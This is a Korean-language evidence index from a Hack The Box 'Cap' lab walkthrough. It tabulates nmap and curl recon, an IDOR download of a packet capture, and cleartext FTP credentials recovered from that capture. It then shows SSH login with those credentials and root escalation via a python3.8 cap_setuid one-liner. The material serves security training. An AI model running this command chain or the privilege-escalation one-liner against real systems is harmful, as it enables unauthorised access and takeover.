# 증적 인덱스 — HTB Cap

| ID | 시각 (UTC) | 단계 | 명령/요청 | 파일 경로 | 핵심 확인 내용 | 민감도 | 상태 |
|----|-----------|------|-----------|-----------|----------------|--------|------|
| E01 | 2026-08-14 07:44 | 정보 수집 | `nmap -sT -p- --min-rate 3000 -Pn $TARGET` | `scans/E01_nmap_full_tcp.txt` | 21(ftp), 22(ssh), 80(http) open | 낮음 | 확인됨 |
| E02 | 2026-08-14 07:45 | 정보 수집 | `nmap -sT -sV -sC -p 21,22,80 -Pn $TARGET` | `scans/E02_nmap_top3_service.txt` | vsftpd 3.0.3, OpenSSH 8.2p1, gunicorn "Security Dashboard" | 낮음 | 확인됨 |
| E03 | 2026-08-14 07:51 | 정보 수집 | `curl -i http://$TARGET/` | `http/E03_http_root.txt` | 대시보드 페이지, 사용자명 "Nathan" 노출, 메뉴에 `/capture`, `/ip`, `/netstat` | 낮음 | 확인됨 |
| E04 | 2026-08-14 07:52 | 정보 수집 | `curl -i http://$TARGET/capture` | `http/E04_http_capture.txt` | `/data/1` 링크 확인 | 낮음 | 확인됨 |
| E05 | 2026-08-14 07:52 | 취약점 확인 | `curl -i http://$TARGET/data/0` | `http/E05_data0_headers.bin` | `/data/<id>` 라우트가 id 검증 없이 200 반환(단, HTML 페이지) | 낮음 | 확인됨 |
| E06 | 2026-08-14 07:53 | 취약점 확인 | `curl -i http://$TARGET/data/1` | `http/E06_data1.pcap` | 페이지 본문에서 실제 다운로드 버튼이 `/download/<id>`로 연결됨을 확인 | 낮음 | 확인됨 |
| E07 | 2026-08-14 07:53 | 취약점 확인 | `curl -c cookiejar http://$TARGET/capture` | `http/E07_capture_headers.txt` | `/capture`가 302로 `/data/1`로 리다이렉트, 세션 쿠키 미사용(인증/세션 상태 없음) | 낮음 | 확인됨 |
| E08 | 2026-08-14 07:53 | 취약점 확인 | `curl -b cookiejar http://$TARGET/data/0` | `http/E08_data0_with_cookie_headers.txt` | 쿠키 유무와 무관하게 동일 동작(세션 미사용 재확인) | 낮음 | 확인됨 |
| E09 | 2026-08-14 07:54 | 초기 접근(IDOR) | `curl -D headers http://$TARGET/download/0` | `http/E09_download0_headers.txt`, `http/E09_0.pcap` | `id=0`으로 2021-05-15 작성된 과거 pcap 파일을 인가 절차 없이 다운로드 (IDOR) | 중간 | 확인됨 |
| E09b | 2026-08-14 07:54 | 자격 증명 추출 | `tshark -r E09_0.pcap -Y ftp ...` / `strings` | (분석 결과, 파일 없음) | pcap 안 평문 FTP 세션에서 `USER nathan` / `PASS Buck3tH4TF0RM3!` 확인 | 높음(자격 증명) | 확인됨 |
| E10 | 2026-08-14 07:55 | 초기 접근 / User 권한 | `ssh nathan@$TARGET` (자격 증명 재사용) → `id`, `hostname`, `pwd`, `cat user.txt` | `logs/E10_ssh_nathan_login.log` | `uid=1001(nathan)`, user flag 획득 | 높음(플래그 포함) | 확인됨 |
| E11 | 2026-08-14 07:58 | 권한 상승 열거 | `getcap -r / 2>/dev/null` | `logs/E11_privesc_enum.log` | `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` | 낮음 | 확인됨 |
| E12 | 2026-08-14 07:58 | 권한 상승 / root 검증 | `python3.8 -c 'import os; os.setuid(0); os.system("id")'` 및 `cat /root/root.txt` | `logs/E12_privesc_root.log` | `uid=0(root)`, root flag 획득 | 높음(플래그 포함) | 확인됨 |

## 참고

- $TARGET = `10.129.8.179` (풀이 당시 세션 종속 값)
- $LHOST = `10.10.15.38` (HTB Machines VPN, AU Machines 2, `tun0`)
- E11에서 `sudo -l`을 먼저 시도했으나 `nathan`의 sudo 비밀번호를 몰라 3회 실패했다(무해한 실패, 계정 잠금 없음). 이후 `sudo` 없이 `getcap`만 재시도해 성공했다.
